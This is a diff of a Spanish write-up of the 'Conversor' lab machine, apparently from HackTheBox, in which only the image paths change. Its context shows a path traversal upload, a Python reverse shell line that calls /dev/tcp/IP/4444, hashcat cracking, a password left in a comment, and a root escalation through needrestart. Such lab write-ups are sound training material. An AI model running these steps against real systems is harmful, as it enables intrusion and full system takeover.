@@ -65,7 +65,7 @@ Realizamos una enumeración  de los 65535 puertos `TCP` del sistema a través de
 nmap -p- --min-rate 5000 -Pn -n -oN nmap-scan 10.129.12.212
 ```
 
-![Arp-Scan output](./images/1_Conversor-nmap-scan.png)
+![Arp-Scan output](images/1_Conversor-nmap-scan.png)
 
 > <= Importante =>
 > En entornos empresariales, enviar grandes cantidades de paquetes `TCP`, `ICMP` o `UDP` suele provocar un congestionamiento  de la red, provocando un ataque `DoS` accidental o ser bloqueados por sistemas de monitorización.
@@ -78,7 +78,7 @@ Observamos que los puertos 22 `(SSH)` y 80 `(HTTP)` se encuentran activos. A par
 nmap -sCV -p22,80 -oN ports-enumeration 10.129.12.212
 ```
 
-![Enumerating ports through Nmap](./images/2-Conversor-ports-enumeration.png)
+![Enumerating ports through Nmap](images/2_Conversor-ports-enumeration.png)
 
 Tras un análisis de la enumeración de puertos, podemos agrupar los resultados en la siguiente tabla:
 
@@ -102,19 +102,19 @@ Previo a acceder a la web del objetivo `Conversor`, se realiza un `mapping` de l
 sudoedit /etc/hosts
 ```
 
-![Map IP of Conversor into the /etc/hosts files](./images/3_Conversor-map-IP-into-etc-hosts.png)
+![Map IP of Conversor into the /etc/hosts files](images/3_Conversor-map-IP-into-etc-hosts.png)
 
 Tras acceder a la página es posible encontrar un panel de sesión. Para acceder creamos un usuario y contraseña.
 
 La página con la dirección `index.html` es una sección donde se permiten subir archivos con extensión `.xml` y `.xslt`, lo cual por si solo se considera un vector de ataque si existe una mala implementación (`CWE-91` y/o `CWE-611`).
 
-![Submit XML and XSLT files section](./images/4_Conversor-submit-xml-xslt-files.png)
+![Submit XML and XSLT files section](images/4_Conversor-submit-xml-xslt-files.png)
 
 > Es de destacar que permitir a los usuarios subir archivos `.XSLT` es considerado una posible brecha de seguridad grave, pues un atacante puede insertar código malicioso e insertar referencias a entidades externas a la página (Hágase especial énfasis en las vulnerabilidades `XXE`).
 
 Si nos dirigidos a la dirección `/about` observamos que es posible descargar el código fuente de la página:
 
-![About page with a "Download Source Code" button](./images/5_Conversor-download-sourcecode.png)
+![About page with a "Download Source Code" button](images/5_Conversor-download-sourcecode.png)
 
 > Esto nos permite analizar la arquitectura de la página web para buscar fallas de seguridad (Como lo sería identificar una falta de sanitización de los archivos subidos por el usuario).
 
@@ -125,7 +125,7 @@ Tras haber descargado y analizado los archivos `app.py` e `install.md` podemos d
 | No se realizan validaciones ni sanitizaciones a los nombres de los archivos subidos, permitiendo una manipulación de rutas (Técnica conocida como `Path Traversal`) | Cronjob encargado de ejecutar _todos_ los códigos `python` en el directorio `/scripts` cada minuto |
 
 
-![Content of app.py and install.md with the relevant information](./images/6_Conversor-path-traversal-and-cronjob-identification.png)
+![Content of app.py and install.md with the relevant information](images/6_Conversor-path-traversal-and-cronjob-identification.png)
 
 Estas 2 vulnerabilidades podrían permitir una un `RCE` si un atacante fuese capaz de subir un archivo a la dirección `/scripts`.
 
@@ -133,13 +133,13 @@ Como primer paso, intentamos comprobar si es posible realizar un `Path Traversal
 
 Utilizando la herramienta `Caido`, interceptamos la petición y la manipulamos:
 
-![Testing the Path Traversal through the "Caido" tool](./images/7_Conversor-replace-arturo-image.png)
+![Testing the Path Traversal through the "Caido" tool](images/7_Conversor-replace-arturo-image.png)
 
 > Modificamos el nombre del archivo, de tal manera que pueda desplazarse entre directorios hasta llegar a la sección `/about` y reemplazar la imagen `arturo.png`.
 
 Tras enviar la petición, observamos que fue posible modificar una imagen en la sección `/about`:
 
-![Image modified through a Path Traversal vulnerability](./images/8_Conversor-modify-arturo.png-image.png)
+![Image modified through a Path Traversal vulnerability](images/8_Conversor-modify-arturo.png-image.png)
 
 ## Explotación
 
@@ -157,7 +157,7 @@ import os
 os.system("bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1'")
 ```
 
-![Uploading a revershell to the /scritps directory](./images/9_Conversor-revershell-path-traversal.png)
+![Uploading a revershell to the /scritps directory](images/9_Conversor-revershell-path-traversal.png)
 
 
 Utilizamos la herramienta `netcat` para entrar en modo escucha en el puerto `4444`. Tras esperar unos segundos, se entabla una conexión con el servidor víctima:
@@ -166,11 +166,11 @@ Utilizamos la herramienta `netcat` para entrar en modo escucha en el puerto `444
 nc -lvnp 4444
 ```
 
-![Establishing connection through netcat](./images/10_Conversor-connection-established-with-conversor.png)
+![Establishing connection through netcat](images/10_Conversor-connection-established-with-conversor.png)
 
 Tras obtener acceso, es posible encontrar la base de datos del servidor en la dirección `/var/www/conversor.htb/instance/users.db`. Esta posee la clave de acceso para el usuario `fismathack`, _hasheada_ a través del algoritmo `MD5` (A día de hoy vulnerable).
 
-![User and password inside the "users.db" file](./images/11_Conversor-identifying-user-and-hashed-password.png)
+![User and password inside the "users.db" file](images/11_Conversor-identifying-user-and-hashed-password.png)
 
 Por medio de `hashacat` podemos _crackear_ el hash a través de un `Dictionary Attack` de la siguiente manera:
 
@@ -188,7 +188,7 @@ hashcat -m 0 -a 0 hash-fismathack.txt wordlist.txt
 ssh fismathack@conversor.htb #Keepmesafeandwarm
 ```
 
-![Access via SSH with the user fismathack](./images/12_Conversor-access-via-ssh-with-fismathack-user.png)
+![Access via SSH with the user fismathack](images/12_Conversor-access-via-ssh-with-fismathack-user.png)
 
 Tras acceder como el usuario `fismathack`, comprobamos si tenemos capacidad de ejecutar binarios con permiso `SUID`.
 
@@ -196,17 +196,17 @@ Tras acceder como el usuario `fismathack`, comprobamos si tenemos capacidad de e
 sudo -l
 ```
 
-![binary with SUID permission](./images/13_Conversor-binaries-with-sudo-permissions.png)
+![binary with SUID permission](images/13_Conversor-binaries-with-sudo-permissions.png)
 
 ### CVE-2024-48990
 
 Observamos que el usuario `fismathack` puede ejecutar `needrestart` como administrador; una búsqueda rápida a través e la página `GTFObins` indica que este binario puede ejecutar código `perl` malicioso almacenado en un archivo con la extensión `.conf`.
 
-![Indications to abuse the binary needrestart, from "GTFObins"](./images/14_Conversor-gftobins-needrestart.png)
+![Indications to abuse the binary needrestart, from "GTFObins"](images/14_Conversor-gftobins-needrestart.png)
 
 Creamos un archivo de configuración (Por ejemplo, `test.conf`). De esta manera, al pedirle a `needrestart` que cargue un archivo de _configuración adicional_, ejecute una `shell` heredada con permisos del usuario `root`. 
 
-![Privilege Escalation through the needrestart binary](./images/15_Conversor-privilege-escalation-with-needrestart-binary.png)
+![Privilege Escalation through the needrestart binary](images/15_Conversor-privilege-escalation-with-needrestart-binary.png)
 
 Ahora tenemos una sesión de `bash` como el usuario `root`, tomando control total del sistema `Conversor`.
 
